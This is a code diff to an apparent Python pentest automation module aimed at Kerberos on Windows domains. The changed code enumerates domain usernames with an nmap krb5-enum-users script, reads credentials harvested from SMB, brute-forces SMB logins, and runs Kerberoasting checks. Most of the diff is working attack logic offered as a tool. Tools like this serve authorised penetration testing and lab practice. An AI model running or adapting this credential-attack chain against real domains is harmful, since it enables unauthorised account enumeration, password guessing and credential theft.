@@ -2,17 +2,12 @@ from mods.mod_utils import *
 import subprocess
 import os
 
-def handle_kerberos(target, domain):
-    # Try to bruteforce Usernames
-    enum_users(target, domain)
-    # Check Kerberoast using guest creds
-    check_kerberoast(target, domain)
-    
 
 def enum_users(target, domain):
     filename = '/usr/share/seclists/Usernames/Names/names.txt'
     cmd = f'nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{domain}",userdb="{filename}" {target}'
     output = None
+    users = []
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
@@ -26,10 +21,13 @@ def enum_users(target, domain):
                     if domain in line:
                         user = line.split('@')[0].split(' ')[-1]
                         printc(user, BLUE)
+                        users.append(user)
     except Exception as e:
         if not os.path.exists(filename):
             print(f'[-] {filename} does not exist.\nPlease install seclists.')
         printc(f'[-] {e}', RED)
+        return users
+    return users
 
 
 def check_rockyou():
@@ -123,5 +121,41 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
                 except Exception as e:
                     printc(f'[-] {e}', RED)
             print_cracking_cmd()
-    
-    
+
+
+def check_smb_credentials(target, domain):
+    # Check credentials founded on SMB first:
+    if os.path.exists('smb_credentials.txt'):
+        with open('smb_credentials.txt', 'r') as file:
+            credentials = file.readlines()
+        cred = ''
+        for item in credentials:
+            if ('Guest' not in item):
+                cred = item
+                break
+        user, passwd = cred.split(':')[:2]
+        check_kerberoast(target, domain, user, passwd)
+        return True
+    return False
+
+
+def handle_kerberos(target, domain):
+    if not check_smb_credentials(target, domain):
+        if os.path.exists('smb_users.txt'):
+            with open('smb_users.txt', 'r') as file:
+                users = file.readlines()
+            if not ('lab' in users):
+                # Try to bruteforce Usernames
+                users = enum_users(target, domain)
+                
+                # Try to bruteforce users credentials
+                import mod_smb
+                mod_smb.smb_users = users
+                mod_smb.export_wordlists()
+                mod_smb.bruteforce(target, '445')
+
+                check_smb_credentials(target, domain)
+
+                # Check Kerberoast using guest creds
+                check_kerberoast(target, domain)
+            # Check Kerberoast with founded users
